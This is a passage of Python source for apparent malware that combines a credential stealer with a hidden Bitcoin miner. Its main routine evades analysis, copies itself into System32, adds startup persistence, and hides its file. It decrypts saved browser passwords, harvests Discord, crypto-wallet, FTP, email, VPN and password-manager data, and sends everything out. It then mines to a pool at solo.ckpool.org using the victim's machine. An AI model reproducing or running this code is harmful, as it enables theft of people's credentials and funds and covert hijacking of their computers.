                f'{{"params": ["{address}", "{ctx.job_id}", "{ctx.extranonce2}", "{ctx.ntime}", "{nonce}"], "id": 1, "method": "mining.submit"}}\n',
                'utf-8')
            log(f'[*] Payload: {payload}')
            sock.sendall(payload)
            ret = sock.recv(1024)
            log(f'[*] Pool response: {ret}')
            return True

        if time.time() - start_time >= 10:
            hashrate = hash_count / (time.time() - start_time)
            log(f'[*] Hashrate: {hashrate:.2f} H/s')
            hash_count = 0
            start_time = time.time()


def block_listener(t):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('solo.ckpool.org', 3333))
    sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
    lines = sock.recv(1024).decode().split('\n')
    response = json.loads(lines[0])
    ctx.sub_details, ctx.extranonce1, ctx.extranonce2_size = response['result']
    sock.sendall(b'{"params": ["' + address.encode() + b'", "password"], "id": 2, "method": "mining.authorize"}\n')
    response = b''
    while response.count(b'\n') < 4 and not (b'mining.notify' in response):
        response += sock.recv(1024)

    responses = [json.loads(res) for res in response.decode().split('\n') if
                 len(res.strip()) > 0 and 'mining.notify' in res]
    ctx.job_id, ctx.prevhash, ctx.coinb1, ctx.coinb2, ctx.merkle_branch, ctx.version, ctx.nbits, ctx.ntime, ctx.clean_jobs = \
    responses[0]['params']
    ctx.updatedPrevHash = ctx.prevhash

    while True:
        t.check_self_shutdown()
        if t.exit:
            break

        response = b''
        while response.count(b'\n') < 4 and not (b'mining.notify' in response):
            response += sock.recv(1024)
        responses = [json.loads(res) for res in response.decode().split('\n') if
                     len(res.strip()) > 0 and 'mining.notify' in res]

        if responses[0]['params'][1] != ctx.prevhash:
            ctx.job_id, ctx.prevhash, ctx.coinb1, ctx.coinb2, ctx.merkle_branch, ctx.version, ctx.nbits, ctx.ntime, ctx.clean_jobs = \
            responses[0]['params']


class CoinMinerThread(ExitedThread):
    def __init__(self, arg=None):
        super().__init__(arg, n=0)

    def thread_handler2(self, arg):
        self.thread_bitcoin_miner(arg)

    def thread_bitcoin_miner(self, arg):
        ctx.listfThreadRunning[self.n] = True
        check_for_shutdown(self)
        try:
            ret = bitcoin_miner(self)
            log(f"[{timer()}] [*] Miner returned {'true' if ret else 'false'}")
        except Exception as e:
            log("[*] Miner()")
            log(e)
            traceback.print_exc()
        ctx.listfThreadRunning[self.n] = False


class NewSubscribeThread(ExitedThread):
    def __init__(self, arg=None):
        super().__init__(arg, n=1)

    def thread_handler2(self, arg):
        self.thread_new_block(arg)

    def thread_new_block(self, arg):
        ctx.listfThreadRunning[self.n] = True
        check_for_shutdown(self)
        try:
            ret = block_listener(self)
        except Exception as e:
            log("[*] Subscribe thread()")
            log(e)
            traceback.print_exc()
        ctx.listfThreadRunning[self.n] = False


def StartMining():
    subscribe_t = NewSubscribeThread(None)
    subscribe_t.start()
    log("[*] Subscribe thread started.")

    time.sleep(4)

    miner_t = CoinMinerThread(None)
    miner_t.start()
    log("[*] Bitcoin Miner Thread Started")


def main():
    all_data = {}
    AntiAnalysis.run_checks()
    copy_to_system32()
    Persistence.add_to_startup()
    if HIDE_SELF:
        Persistence.hide_file()

    get_system_info(all_data)
    Discord.discord_main(all_data)

    for name, path in browser_paths.items():
        if not path.startswith('AppData'):
            continue
        key = fetching_encryption_key(browser=path)
        if not key:
            continue
        db_path = os.path.join(os.environ["USERPROFILE"], path, "default", "Login Data")
        if not os.path.exists(db_path):
            continue
        filename = "Passwords.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        passwords = []
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            if user_name or decrypted_password:
                passwords.append({
                    "MainURL": main_url,
                    "LoginURL": login_page_url,
                    "Username": user_name,
                    "Password": decrypted_password
                })
        cursor.close()
        db.close()
        if passwords:
            all_data[f"{name} Passwords"] = passwords
        try:
            os.remove(filename)
        except:
            pass

    get_crypto_wallets(all_data)
    get_ftp_clients(all_data)
    get_email_clients(all_data)
    get_messengers(all_data)
    get_vpn_configs(all_data)
    get_password_managers(all_data)
    get_game_launchers(all_data)
    get_development_tools(all_data)

    send(all_data)

    signal(SIGINT, handler)
    StartMining()


if __name__ == "__main__":
    main()